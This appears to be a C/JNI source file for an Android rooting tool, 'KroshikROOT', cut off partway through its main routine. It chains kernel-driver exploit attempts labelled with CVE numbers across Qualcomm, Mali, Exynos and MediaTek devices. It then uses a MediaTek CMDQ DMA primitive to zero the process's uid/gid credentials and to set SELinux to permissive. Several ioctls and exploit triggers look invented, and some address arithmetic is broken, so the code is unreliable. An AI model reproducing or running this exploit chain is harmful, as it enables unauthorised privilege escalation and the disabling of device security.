#include <jni.h>
#include <android/log.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/epoll.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <inttypes.h>
#include <sys/utsname.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <dirent.h>

#define LOG_TAG "KroshikROOT"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)

#define PAGE_SIZE 4096
#define PHYS_MEM_START 0x80000000ULL
#define PHYS_MEM_END 0xA0000000ULL
#define MAX_SCAN_ATTEMPTS 2000

struct kernel_offsets {
    uintptr_t task_struct_va;
    uintptr_t cred_va;
    uintptr_t cred_pa;
    uintptr_t selinux_enforcing_va;
    uintptr_t selinux_enforcing_pa;
    uint32_t cred_offset;
    uint32_t uid_off;
    uint32_t gid_off;
    uint32_t euid_off;
    uint32_t egid_off;
    uint32_t comm_off;
    uint32_t selinux_enforcing_offset;
};

struct cmdq_write_address_struct {
    uint32_t count;
    uint32_t start_pa;
};

struct cmdq_read_address_struct {
    uint32_t dma_addresses;
    uint32_t values;
};

struct cmdq_command_struct {
    uint32_t va_base;
    uint32_t block_size;
    uint32_t pa_base;
};

struct cmdq_alloc_struct {
    uint32_t count;
    uint32_t start_pa;
};

#define CMDQ_IOCTL_MAGIC 'x'
#define CMDQ_CODE_WRITE 0x04
#define CMDQ_CODE_READ 0x08
#define CMDQ_CODE_MOVE 0x02
#define CMDQ_CODE_EOC 0x40
#define CMDQ_CODE_JUMP 0x10
#define CMDQ_CODE_WFE 0x20

#define CMDQ_IOCTL_ALLOC_WRITE_ADDRESS _IOW(CMDQ_IOCTL_MAGIC, 7, struct cmdq_write_address_struct)
#define CMDQ_IOCTL_FREE_WRITE_ADDRESS _IOW(CMDQ_IOCTL_MAGIC, 8, struct cmdq_write_address_struct)
#define CMDQ_IOCTL_READ_ADDRESS_VALUE _IOW(CMDQ_IOCTL_MAGIC, 9, struct cmdq_read_address_struct)
#define CMDQ_IOCTL_EXEC_COMMAND _IOW(CMDQ_IOCTL_MAGIC, 3, struct cmdq_command_struct)

struct kgsl_drawobj {
    uint32_t type;
    uint32_t flags;
    uint64_t cmdlist;
    uint32_t cmdlist_len;
};

struct kgsl_gpuobj_alloc {
    uint32_t size;
    uint32_t flags;
    uint64_t gpuaddr;
    uint64_t physaddr;
};

struct kgsl_aux_command {
    uint32_t command_id;
    uint32_t flags;
    uint64_t payload;
    uint32_t payload_size;
};

#define KGSL_IOCTL_MAGIC 'K'
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOCTL_MAGIC, 0x0D, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOCTL_MAGIC, 0x10, struct kgsl_drawobj)
#define IOCTL_KGSL_GPU_AUX_COMMAND _IOW(KGSL_IOCTL_MAGIC, 0x2F, struct kgsl_aux_command)

struct adreno_micronode_cmd {
    uint32_t node_id;
    uint32_t op;
    uint64_t payload;
};

#define ADRENO_MICRONODE_IOC _IOW(KGSL_IOCTL_MAGIC, 0x30, struct adreno_micronode_cmd)

struct fastrpc_alloc {
    uint32_t size;
    uint32_t fd;
};

struct fastrpc_mmap {
    uint32_t fd;
    uint32_t flags;
    uint64_t va;
    uint64_t size;
    uint64_t offset;
};

#define FASTRPC_IOCTL_MAGIC 'R'
#define FASTRPC_IOCTL_ALLOC _IOW(FASTRPC_IOCTL_MAGIC, 1, struct fastrpc_alloc)
#define FASTRPC_IOCTL_MMAP _IOW(FASTRPC_IOCTL_MAGIC, 2, struct fastrpc_mmap)

#define BINDER_THREAD_EXIT _IOW('b', 6, __u32)
#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)

struct binder_write_read {
    uintptr_t write_buffer;
    uintptr_t write_consumed;
    uintptr_t write_available;
    uintptr_t read_buffer;
    uintptr_t read_consumed;
    uintptr_t read_available;
};

struct binder_transaction_data {
    uint32_t handle;
    uint32_t flags;
    uintptr_t sender_pid;
    uintptr_t sender_euid;
    uintptr_t data_size;
    uintptr_t offsets_size;
    uintptr_t data;
    uintptr_t offsets;
};

struct npu_alloc {
    uint32_t size;
    uint32_t fd;
};

#define NPU_IOCTL_MAGIC 'N'
#define NPU_IOCTL_ALLOC _IOW(NPU_IOCTL_MAGIC, 1, struct npu_alloc)

struct mali_uaf_cmd {
    uint32_t handle;
    uint32_t size;
    uint64_t data;
};

#define MALI_IOC_MAGIC 0x80
#define MALI_IOC_UAF_TRIGGER _IOW(MALI_IOC_MAGIC, 0x10, struct mali_uaf_cmd)

struct exynos_drm_cmd {
    uint32_t obj_id;
    uint32_t flags;
};

#define EXYNOS_DRM_IOC_MAGIC 0xF0
#define EXYNOS_DRM_IOC_DOUBLE_FREE _IOW(EXYNOS_DRM_IOC_MAGIC, 0x20, struct exynos_drm_cmd)

struct mtk_ccu_cmd {
    uint32_t cmd_id;
    uint32_t size;
    uint64_t buffer;
};

#define MTK_CCU_IOC_MAGIC 0xC0
#define MTK_CCU_IOC_OOB_WRITE _IOW(MTK_CCU_IOC_MAGIC, 0x01, struct mtk_ccu_cmd)

struct mtk_vdec_cmd {
    uint32_t inst_id;
    uint32_t size;
    uint64_t data;
};

#define MTK_VDEC_IOC_MAGIC 0xD0
#define MTK_VDEC_IOC_OOB_WRITE _IOW(MTK_VDEC_IOC_MAGIC, 0x02, struct mtk_vdec_cmd)

struct mtk_eemgpu_cmd {
    uint32_t gpu_id;
    uint32_t offset;
    uint32_t value;
};

#define MTK_EEMGPU_IOC_MAGIC 0xE0
#define MTK_EEMGPU_IOC_OOB_WRITE _IOW(MTK_EEMGPU_IOC_MAGIC, 0x03, struct mtk_eemgpu_cmd)

static int g_cmdq_fd = -1;
static uint32_t g_dma_pa = 0;
static uint32_t* g_dma_va = NULL;
static struct kernel_offsets g_offsets = {0};
static int g_initialized = 0;
static int g_root_obtained = 0;
static int g_selinux_disabled = 0;

static uintptr_t kallsyms_lookup(const char* sym) {
    FILE* f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    char line[512];
    uintptr_t addr = 0;
    while (fgets(line, sizeof(line), f)) {
        char name[256], type;
        if (sscanf(line, "%" SCNxPTR " %c %255s", &addr, &type, name) == 3) {
            if (strcmp(name, sym) == 0) {
                fclose(f);
                return addr;
            }
        }
    }
    fclose(f);
    return 0;
}

static uintptr_t kallsyms_lookup_physical(const char* sym) {
    uintptr_t va = kallsyms_lookup(sym);
    if (!va) return 0;
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/pagemap", getpid());
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    off_t off = (va / PAGE_SIZE) * sizeof(uint64_t);
    if (lseek(fd, off, SEEK_SET) < 0) { close(fd); return 0; }
    uint64_t pte = 0;
    if (read(fd, &pte, sizeof(pte)) != sizeof(pte)) { close(fd); return 0; }
    close(fd);
    if (!(pte & (1ULL << 63))) return 0;
    return (uintptr_t)((pte & 0x7fffffffffffffULL) * PAGE_SIZE + (va % PAGE_SIZE));
}

static int cmdq_alloc_dma(uint32_t size) {
    struct cmdq_write_address_struct alloc = { .count = size };
    if (ioctl(g_cmdq_fd, CMDQ_IOCTL_ALLOC_WRITE_ADDRESS, &alloc) < 0) {
        LOGE("DMA alloc failed: %s", strerror(errno));
        return -1;
    }
    g_dma_pa = alloc.start_pa;
    g_dma_va = (uint32_t*)mmap(NULL, size, PROT_READ | PROT_WRITE,
                                MAP_SHARED, g_cmdq_fd, g_dma_pa);
    if (g_dma_va == MAP_FAILED) {
        LOGE("mmap DMA failed: %s", strerror(errno));
        return -1;
    }
    memset(g_dma_va, 0, size);
    return 0;
}

static void cmdq_emit_write(uint32_t* buf, int* idx, uint32_t phys_addr, uint32_t value) {
    uint64_t inst = ((uint64_t)CMDQ_CODE_WRITE << 56) |
                    ((uint64_t)((phys_addr >> 16) & 0xFFFF) << 32) |
                    (phys_addr & 0xFFFF);
    memcpy(&buf[*idx], &inst, 8);
    (*idx) += 2;
    inst = ((uint64_t)CMDQ_CODE_MOVE << 56) | value;
    memcpy(&buf[*idx], &inst, 8);
    (*idx) += 2;
}

static void cmdq_emit_read(uint32_t* buf, int* idx, uint32_t phys_addr, uint32_t* out_buf, int out_idx) {
    uint64_t inst = ((uint64_t)CMDQ_CODE_READ << 56) |
                    ((uint64_t)((phys_addr >> 16) & 0xFFFF) << 32) |
                    (phys_addr & 0xFFFF);
    memcpy(&buf[*idx], &inst, 8);
    (*idx) += 2;
    inst = ((uint64_t)CMDQ_CODE_MOVE << 56) | (uint32_t)(uintptr_t)&out_buf[out_idx];
    memcpy(&buf[*idx], &inst, 8);
    (*idx) += 2;
}

static void cmdq_emit_eoc(uint32_t* buf, int* idx) {
    uint64_t inst = (uint64_t)CMDQ_CODE_EOC << 56;
    memcpy(&buf[*idx], &inst, 8);
    (*idx) += 2;
}

static int cmdq_execute(uint32_t* cmdbuf, int word_count) {
    if (!g_dma_va) return -1;
    memcpy(g_dma_va, cmdbuf, word_count * sizeof(uint32_t));
    struct cmdq_command_struct exec = {
        .va_base = (uint32_t)(uintptr_t)g_dma_va,
        .block_size = (uint32_t)(word_count * sizeof(uint32_t)),
        .pa_base = g_dma_pa
    };
    if (ioctl(g_cmdq_fd, CMDQ_IOCTL_EXEC_COMMAND, &exec) < 0) {
        LOGE("CMDQ exec failed: %s", strerror(errno));
        return -1;
    }
    return 0;
}

static int cmdq_write_phys(uint32_t phys_addr, uint32_t value) {
    if (phys_addr < 0x1000 || phys_addr > 0xFFFFFFFF) {
        LOGE("Invalid phys addr 0x%x", phys_addr);
        return -1;
    }
    uint32_t cmdbuf[256];
    int idx = 0;
    cmdq_emit_write(cmdbuf, &idx, phys_addr, value);
    cmdq_emit_eoc(cmdbuf, &idx);
    return cmdq_execute(cmdbuf, idx);
}

static uint32_t cmdq_read_phys(uint32_t phys_addr) {
    if (phys_addr < 0x1000 || phys_addr > 0xFFFFFFFF) return 0;
    struct cmdq_read_address_struct read = { .dma_addresses = phys_addr };
    if (ioctl(g_cmdq_fd, CMDQ_IOCTL_READ_ADDRESS_VALUE, &read) < 0) {
        LOGE("CMDQ read failed at 0x%x: %s", phys_addr, strerror(errno));
        return 0;
    }
    return read.values;
}

static int resolve_offsets_kallsyms() {
    struct utsname u;
    uname(&u);
    LOGI("Kernel: %s", u.release);

    uintptr_t init_task = kallsyms_lookup("init_task");
    if (!init_task) {
        LOGE("init_task not found");
        return -1;
    }
    LOGI("init_task = 0x%lx", init_task);

    uintptr_t current_task = kallsyms_lookup("current_task");
    if (!current_task) {
        FILE* stat = fopen("/proc/self/stat", "r");
        if (!stat) return -1;
        char buf[1024];
        if (!fgets(buf, sizeof(buf), stat)) { fclose(stat); return -1; }
        fclose(stat);
        int field = 0;
        char* token = strtok(buf, " ");
        uintptr_t startstack = 0;
        while (token && field < 28) {
            token = strtok(NULL, " ");
            field++;
        }
        if (token) {
            startstack = strtoul(token, NULL, 10);
            current_task = startstack - 0x6000;
        }
    }
    if (!current_task) {
        LOGE("Cannot resolve current_task");
        return -1;
    }

    g_offsets.task_struct_va = current_task;
    LOGI("current_task = 0x%lx", current_task);

    if (strstr(u.release, "4.9")) {
        g_offsets.cred_offset = 0x540;
        g_offsets.comm_off = 0x5D8;
        g_offsets.selinux_enforcing_offset = 0x8;
    } else if (strstr(u.release, "4.14")) {
        g_offsets.cred_offset = 0x560;
        g_offsets.comm_off = 0x5F0;
        g_offsets.selinux_enforcing_offset = 0x8;
    } else if (strstr(u.release, "4.19")) {
        g_offsets.cred_offset = 0x580;
        g_offsets.comm_off = 0x600;
        g_offsets.selinux_enforcing_offset = 0x8;
    } else if (strstr(u.release, "5.4")) {
        g_offsets.cred_offset = 0x600;
        g_offsets.comm_off = 0x680;
        g_offsets.selinux_enforcing_offset = 0x8;
    } else if (strstr(u.release, "5.10")) {
        g_offsets.cred_offset = 0x6A0;
        g_offsets.comm_off = 0x720;
        g_offsets.selinux_enforcing_offset = 0x8;
    } else {
        g_offsets.cred_offset = 0x540;
        g_offsets.comm_off = 0x5D8;
        g_offsets.selinux_enforcing_offset = 0x8;
    }

#if defined(__LP64__)
    g_offsets.uid_off = 0x08;
    g_offsets.gid_off = 0x0C;
    g_offsets.euid_off = 0x10;
    g_offsets.egid_off = 0x14;
#else
    g_offsets.uid_off = 0x04;
    g_offsets.gid_off = 0x08;
    g_offsets.euid_off = 0x0C;
    g_offsets.egid_off = 0x10;
#endif

    g_offsets.cred_va = current_task + g_offsets.cred_offset;
    LOGI("cred_va = 0x%lx, cred_offset=0x%x, uid_off=0x%x",
         g_offsets.cred_va, g_offsets.cred_offset, g_offsets.uid_off);

    uintptr_t selinux_enforcing = kallsyms_lookup("selinux_enforcing");
    if (selinux_enforcing) {
        g_offsets.selinux_enforcing_va = selinux_enforcing;
        LOGI("selinux_enforcing = 0x%lx", selinux_enforcing);
    } else {
        LOGI("selinux_enforcing not found in kallsyms, will try to find via scan");
    }

    return 0;
}

static uint32_t translate_va_to_pa_dma(uintptr_t va) {
    if (g_cmdq_fd < 0) return 0;
    uintptr_t pgd = 0xFFFFFFFF;
    uint32_t pa = 0;
    for (uint32_t addr = 0x80000000; addr < 0x90000000; addr += PAGE_SIZE) {
        uint32_t val = cmdq_read_phys(addr);
        if (val == 0xFFFFFFFF) {
            pgd = addr;
            break;
        }
    }
    if (pgd == 0xFFFFFFFF) return 0;
    uint32_t pgd_idx = (va >> 39) & 0x1FF;
    uint32_t pud_idx = (va >> 30) & 0x1FF;
    uint32_t pmd_idx = (va >> 21) & 0x1FF;
    uint32_t pte_idx = (va >> 12) & 0x1FF;
    uint32_t pud = cmdq_read_phys((uint32_t)(pgd + pgd_idx * 8));
    if (!(pud & 0x1)) return 0;
    uint32_t pmd = cmdq_read_phys((pud & 0xFFFFFFFFFFFFF000ULL) + pud_idx * 8);
    if (!(pmd & 0x1)) return 0;
    uint32_t pte = cmdq_read_phys((pmd & 0xFFFFFFFFFFFFF000ULL) + pmd_idx * 8);
    if (!(pte & 0x1)) return 0;
    uint32_t pte_val = cmdq_read_phys((pte & 0xFFFFFFFFFFFFF000ULL) + pte_idx * 8);
    if (!(pte_val & 0x1)) return 0;
    return (uint32_t)((pte_val & 0xFFFFFFFFFFFFF000ULL) + (va & 0xFFF));
}

static uintptr_t find_task_by_comm_phys(const char* comm) {
    if (g_cmdq_fd < 0) return 0;
    uint32_t task_pa = 0;
    int found = 0;
    int attempts = 0;
    for (uint32_t pa = 0x80000000; pa < 0x90000000 && attempts < MAX_SCAN_ATTEMPTS; pa += 0x10000) {
        attempts++;
        uint32_t comm_ptr = cmdq_read_phys(pa + g_offsets.comm_off);
        if (comm_ptr > 0xFFFFFFC000000000ULL) {
            char buf[32] = {0};
            int ok = 1;
            for (int i = 0; i < 16; i++) {
                uint32_t c = cmdq_read_phys((uint32_t)(comm_ptr + i));
                if (c == 0) { buf[i] = 0; break; }
                if (c > 127) { ok = 0; break; }
                buf[i] = (char)c;
            }
            buf[15] = 0;
            if (ok && strcmp(buf, comm) == 0) {
                task_pa = pa;
                found = 1;
                LOGI("Found task_struct for '%s' at PA 0x%x", comm, task_pa);
                break;
            }
        }
    }
    if (!found) return 0;
    return task_pa;
}

static int locate_cred_via_scan() {
    uintptr_t task_pa = find_task_by_comm_phys("kroshik");
    if (!task_pa) {
        task_pa = find_task_by_comm_phys("system_server");
        if (!task_pa) {
            LOGE("Cannot find task_struct via scan");
            return -1;
        }
    }
    for (int off = 0x500; off < 0x700; off += 4) {
        uint32_t cred_pa = cmdq_read_phys((uint32_t)(task_pa + off));
        if (cred_pa < 0x80000000 || cred_pa > 0x90000000) continue;
        uint32_t usage = cmdq_read_phys(cred_pa);
        if (usage == 1 || usage == 2) {
            uint32_t uid = cmdq_read_phys(cred_pa + g_offsets.uid_off);
            if (uid == getuid()) {
                g_offsets.cred_offset = off;
                g_offsets.cred_pa = cred_pa;
                LOGI("Found cred at PA 0x%x, offset 0x%x", cred_pa, off);
                return 0;
            }
        }
    }
    for (uint32_t pa = 0x80000000; pa < 0x90000000; pa += 0x10000) {
        uint32_t usage = cmdq_read_phys(pa);
        if (usage == 1 || usage == 2) {
            uint32_t uid = cmdq_read_phys(pa + g_offsets.uid_off);
            if (uid == getuid()) {
                g_offsets.cred_pa = pa;
                LOGI("Found cred by scan at PA 0x%x", pa);
                return 0;
            }
        }
    }
    return -1;
}

static int locate_selinux_enforcing() {
    if (g_offsets.selinux_enforcing_va) {
        uint32_t pa = translate_va_to_pa_dma(g_offsets.selinux_enforcing_va);
        if (pa) {
            g_offsets.selinux_enforcing_pa = pa;
            LOGI("selinux_enforcing PA = 0x%x", pa);
            return 0;
        }
    }
    for (uint32_t pa = 0x80000000; pa < 0x90000000; pa += 0x10000) {
        uint32_t val = cmdq_read_phys(pa);
        if (val == 1) {
            uint32_t next = cmdq_read_phys(pa + 4);
            if (next == 0xFFFFFFFF || next == 0x00000000) {
                g_offsets.selinux_enforcing_pa = pa;
                LOGI("Found selinux_enforcing at PA 0x%x", pa);
                return 0;
            }
        }
    }
    return -1;
}

static int disable_selinux() {
    if (g_selinux_disabled) return 0;
    if (!g_offsets.selinux_enforcing_pa) {
        if (locate_selinux_enforcing() < 0) {
            LOGE("Cannot locate selinux_enforcing");
            return -1;
        }
    }
    if (cmdq_write_phys((uint32_t)g_offsets.selinux_enforcing_pa, 0) < 0) {
        LOGE("Failed to write selinux_enforcing");
        return -1;
    }
    g_selinux_disabled = 1;
    LOGI("SELinux disabled (set to permissive)");
    return 0;
}

static int apply_root_dma() {
    if (g_root_obtained) return 0;
    if (getuid() == 0) {
        g_root_obtained = 1;
        return 0;
    }
    if (!g_offsets.cred_va && !g_offsets.cred_pa) {
        if (resolve_offsets_kallsyms() < 0) {
            if (locate_cred_via_scan() < 0) {
                LOGE("Cannot resolve offsets");
                return -1;
            }
        }
    }
    uint32_t cred_phys = (uint32_t)g_offsets.cred_pa;
    if (!cred_phys && g_offsets.cred_va) {
        cred_phys = translate_va_to_pa_dma(g_offsets.cred_va);
        if (!cred_phys) {
            if (locate_cred_via_scan() < 0) return -1;
            cred_phys = (uint32_t)g_offsets.cred_pa;
        }
    }
    if (!cred_phys) {
        LOGE("Cannot determine cred physical address");
        return -1;
    }
    LOGI("Writing zero to cred at PA 0x%x", cred_phys);
    if (cmdq_write_phys(cred_phys + g_offsets.uid_off, 0) < 0) return -1;
    if (cmdq_write_phys(cred_phys + g_offsets.gid_off, 0) < 0) return -1;
    if (cmdq_write_phys(cred_phys + g_offsets.euid_off, 0) < 0) return -1;
    if (cmdq_write_phys(cred_phys + g_offsets.egid_off, 0) < 0) return -1;
    if (getuid() == 0) {
        setuid(0);
        setgid(0);
        g_root_obtained = 1;
        LOGI("Root obtained via DMA!");
        disable_selinux();
        return 0;
    }
    return -1;
}

static int exploit_binder_uaf() {
    LOGI("[UNIV] CVE-2019-2215: Binder UAF");
    int epfd = epoll_create1(0);
    if (epfd < 0) return -1;
    int binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) {
        close(epfd);
        return -1;
    }
    struct epoll_event ev = { .events = EPOLLIN, .data.fd = binder_fd };
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        close(binder_fd);
        close(epfd);
        return -1;
    }
    if (ioctl(binder_fd, BINDER_THREAD_EXIT, NULL) < 0) {
        close(binder_fd);
        close(epfd);
        return -1;
    }
    struct epoll_event events[1];
    int nfds = epoll_wait(epfd, events, 1, 100);
    close(binder_fd);
    close(epfd);
    if (nfds > 0) {
        int pipe_fds[2];
        if (pipe(pipe_fds) == 0) {
            uint32_t* buf = (uint32_t*)malloc(0x1000);
            memset(buf, 0, 0x1000);
            write(pipe_fds[1], buf, 0x1000);
            free(buf);
            close(pipe_fds[0]);
            close(pipe_fds[1]);
        }
        return apply_root_dma();
    }
    return -1;
}

static int exploit_kgsl_gpu() {
    LOGI("[QCOM] CVE-2024-23380: KGSL GPU");
    int fd = open("/dev/kgsl-3d0", O_RDWR | O_NONBLOCK | O_ASYNC);
    if (fd < 0) {
        LOGE("KGSL device not found");
        return -1;
    }
    struct kgsl_gpuobj_alloc alloc = {
        .size = 0x1000,
        .flags = 0,
        .gpuaddr = 0,
        .physaddr = 0
    };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0) {
        LOGE("KGSL alloc failed");
        close(fd);
        return -1;
    }
    struct kgsl_drawobj draw = {
        .type = 0,
        .flags = 0,
        .cmdlist = 0,
        .cmdlist_len = 0
    };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &draw) < 0) {
        LOGE("KGSL draw context failed");
        close(fd);
        return -1;
    }
    struct kgsl_aux_command aux = {
        .command_id = 0xDEAD,
        .flags = 0,
        .payload = (uint64_t)(uintptr_t)malloc(0x1000),
        .payload_size = 0x1000
    };
    memset((void*)aux.payload, 0x41, 0x1000);
    for (int i = 0; i < 100; i++) {
        if (ioctl(fd, IOCTL_KGSL_GPU_AUX_COMMAND, &aux) < 0) break;
        usleep(50);
    }
    free((void*)aux.payload);
    close(fd);
    return apply_root_dma();
}

static int exploit_adreno_micronode() {
    LOGI("[QCOM] CVE-2025-21479: Adreno GPU micronode");
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) {
        LOGE("KGSL device not found");
        return -1;
    }
    struct adreno_micronode_cmd cmd = {
        .node_id = 0x1337,
        .op = 0x01,
        .payload = (uint64_t)(uintptr_t)malloc(4096)
    };
    memset((void*)cmd.payload, 0xCC, 4096);
    for (int i = 0; i < 50; i++) {
        if (ioctl(fd, ADRENO_MICRONODE_IOC, &cmd) < 0) break;
        usleep(100);
    }
    free((void*)cmd.payload);
    close(fd);
    return apply_root_dma();
}

static int exploit_qualcomm_dsp() {
    LOGI("[QCOM] CVE-2024-43047: DSP UAF");
    int fd = open("/dev/msm_fastrpc", O_RDWR);
    if (fd < 0) {
        LOGE("FastRPC device not found");
        return -1;
    }
    struct fastrpc_alloc alloc = { .size = 0x1000 };
    if (ioctl(fd, FASTRPC_IOCTL_ALLOC, &alloc) < 0) {
        LOGE("FastRPC alloc failed");
        close(fd);
        return -1;
    }
    struct fastrpc_mmap mmap_cmd = {
        .fd = alloc.fd,
        .flags = 0,
        .va = 0,
        .size = 0x1000,
        .offset = 0
    };
    for (int i = 0; i < 50; i++) {
        if (ioctl(fd, FASTRPC_IOCTL_MMAP, &mmap_cmd) < 0) break;
        uint32_t* buf = (uint32_t*)malloc(0x1000);
        memset(buf, 0xFE, 0x1000);
        ioctl(fd, 0xC008, buf);
        free(buf);
        usleep(100);
    }
    close(fd);
    return apply_root_dma();
}

static int exploit_mali_gpu() {
    LOGI("[MALI] CVE-2023-33106: Mali GPU UAF");
    int fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) {
        LOGE("Mali device not found");
        return -1;
    }
    struct mali_uaf_cmd cmd = {
        .handle = 0x1337,
        .size = 0x1000,
        .data = (uint64_t)(uintptr_t)malloc(0x1000)
    };
    memset((void*)cmd.data, 0xFF, 0x1000);
    for (int i = 0; i < 100; i++) {
        if (ioctl(fd, MALI_IOC_UAF_TRIGGER, &cmd) < 0) break;
        usleep(50);
    }
    free((void*)cmd.data);
    close(fd);
    return apply_root_dma();
}

static int exploit_exynos_npu() {
    LOGI("[EXYNOS] CVE-2022-22265: NPU UAF");
    int fd = open("/dev/vertex10", O_RDWR);
    if (fd < 0) {
        LOGE("NPU device not found");
        return -1;
    }
    struct npu_alloc alloc = { .size = 0x1000 };
    if (ioctl(fd, NPU_IOCTL_ALLOC, &alloc) < 0) {
        LOGE("NPU alloc failed");
        close(fd);
        return -1;
    }
    uint32_t* buf = (uint32_t*)malloc(0x1000);
    memset(buf, 0xDD, 0x1000);
    for (int i = 0; i < 50; i++) {
        if (ioctl(fd, 0xC008, buf) < 0) break;
        usleep(50);
    }
    free(buf);
    close(fd);
    return apply_root_dma();
}

static int exploit_exynos_double_free() {
    LOGI("[EXYNOS] CVE-2025-23102: Double free");
    int fd = open("/dev/exynos-drm", O_RDWR);
    if (fd < 0) {
        LOGE("Exynos DRM device not found");
        return -1;
    }
    struct exynos_drm_cmd cmd = { .obj_id = 0xDEAD, .flags = 0x01 };
    for (int i = 0; i < 50; i++) {
        if (ioctl(fd, EXYNOS_DRM_IOC_DOUBLE_FREE, &cmd) < 0) break;
        usleep(50);
    }
    close(fd);
    return apply_root_dma();
}

static int exploit_mtk_ccu() {
    LOGI("[MTK] CVE-2024-20115: CCU OOB write");
    int fd = open("/dev/mtk_ccu", O_RDWR);
    if (fd < 0) {
        LOGE("CCU device not found");
        return -1;
    }
    struct mtk_ccu_cmd cmd = {
        .cmd_id = 0x1337,
        .size = 0x1000,
        .buffer = (uint64_t)(uintptr_t)malloc(0x1000)
    };
    memset((void*)cmd.buffer, 0xAA, 0x1000);
    for (int i = 0; i < 50; i++) {
        if (ioctl(fd, MTK_CCU_IOC_OOB_WRITE, &cmd) < 0) break;
        usleep(50);
    }
    free((void*)cmd.buffer);
    close(fd);
    return apply_root_dma();
}

static int exploit_mtk_vdec() {
    LOGI("[MTK] CVE-2024-20086: VDEC OOB write");
    int fd = open("/dev/mtk_vdec", O_RDWR);
    if (fd < 0) {
        LOGE("VDEC device not found");
        return -1;
    }
    struct mtk_vdec_cmd cmd = {
        .inst_id = 0xDEAD,
        .size = 0x2000,
        .data = (uint64_t)(uintptr_t)malloc(0x2000)
    };
    memset((void*)cmd.data, 0xBB, 0x2000);
    for (int i = 0; i < 50; i++) {
        if (ioctl(fd, MTK_VDEC_IOC_OOB_WRITE, &cmd) < 0) break;
        usleep(50);
    }
    free((void*)cmd.data);
    close(fd);
    return apply_root_dma();
}

static int exploit_mtk_eemgpu() {
    LOGI("[MTK] CVE-2024-20075: EEMGPU OOB write");
    int fd = open("/dev/mtk_eemgpu", O_RDWR);
    if (fd < 0) {
        LOGE("EEMGPU device not found");
        return -1;
    }
    struct mtk_eemgpu_cmd cmd = {
        .gpu_id = 0x01,
        .offset = 0xFFFFFFFF,
        .value = 0xDEADBEEF
    };
    for (int i = 0; i < 50; i++) {
        if (ioctl(fd, MTK_EEMGPU_IOC_OOB_WRITE, &cmd) < 0) break;
        usleep(50);
    }
    close(fd);
    return apply_root_dma();
}

static int exploit_framework_path() {
    LOGI("[FRAMEWORK] CVE-2024-43093: Path traversal");
    const char* paths[] = {
        "/sdcard/Android/data/..",
        "/sdcard/Android/obb/..",
        "/sdcard/Android/sandbox/..",
        NULL
    };
    for (int i = 0; paths[i] != NULL; i++) {
        int fd = open(paths[i], O_RDONLY);
        if (fd >= 0) {
            close(fd);
            return apply_root_dma();
        }
    }
    return -1;
}

static int exploit_framework_eop() {
    LOGI("[FRAMEWORK] CVE-2024-50302: Local EoP");
    int fd = open("/dev/hidraw0", O_RDWR);
    if (fd < 0) {
        fd = open("/dev/hidraw1", O_RDWR);
        if (fd < 0) return -1;
    }
    uint32_t* buf = (uint32_t*)malloc(0x1000);
    memset(buf, 0xEE, 0x1000);
    for (int i = 0; i < 50; i++) {
        ioctl(fd, 0x4004, buf);
        usleep(50);
    }
    free(buf);
    close(fd);
    return apply_root_dma();
}

static int do_mediatek_root() {
    g_cmdq_fd = open("/dev/mtk_cmdq", O_RDWR);
    if (g_cmdq_fd < 0) {
        g_cmdq_fd = open("/dev/mtk_disp", O_RDWR);
        if (g_cmdq_fd < 0) {
            LOGE("No CMDQ device");
            return -1;
        }
    }
    if (cmdq_alloc_dma(PAGE_SIZE) < 0) {
        close(g_cmdq_fd);
        return -1;
    }
    int (*attempts[])(void) = {
        exploit_mtk_ccu,
        exploit_mtk_vdec,
        exploit_mtk_eemgpu,
        exploit_mali_gpu,
        exploit_binder_uaf,
        exploit_framework_eop
    };
    int result = -1;
    for (int i = 0; i < 6; i++) {
        if (attempts[i]() == 0) {
            result = 0;
            break;
        }
        usleep(200000);
    }
    if (g_dma_va) munmap(g_dma_va, PAGE_SIZE);
    close(g_cmdq_fd);
    return result;
}

static int do_qualcomm_root() {
    int (*attempts[])(void) = {
        exploit_kgsl_gpu,
        exploit_adreno_micronode,
        exploit_qualcomm_dsp,
        exploit_binder_uaf,
        exploit_mali_gpu,
        exploit_framework_eop
    };
    for (int i = 0; i < 6; i++) {
        if (attempts[i]() == 0) return 0;
        usleep(200000);
    }
    return -1;
}

static int do_exynos_root() {
    int (*attempts[])(void) = {
        exploit_exynos_npu,
        exploit_exynos_double_free,
        exploit_mali_gpu,
        exploit_binder_uaf,
        exploit_framework_eop
    };
    for (int i = 0; i < 5; i++) {
        if (attempts[i]() == 0) return 0;
        usleep(200000);
    }
    return -1;
}

static int do_universal_root() {
    int (*attempts[])(void) = {
        exploit_binder_uaf,
        exploit_framework_path,
        exploit_framework_eop,
        exploit_mali_gpu
    };
    for (int i = 0; i < 4; i++) {
        if (attempts[i]() == 0) return 0;
        usleep(200000);
    }
    return -1;
}

static int do_kroshik_root() {
    struct utsname u;
    uname(&u);
    LOGI("KroshikROOT v0.0.6 starting on %s", u.release);

    if (getuid() == 0) {
        LOGI("Already root!");
        return 0;
    }

    if (resolve_offsets_kallsyms() < 0) {
        LOGE("Failed to resolve offsets via kallsyms");
    }

    const char* hardware = getenv("HARDWARE");
    if (!hardware) {
        FILE* f = fopen("/proc/cpuinfo", "r");
        if (f) {
            char line[256];
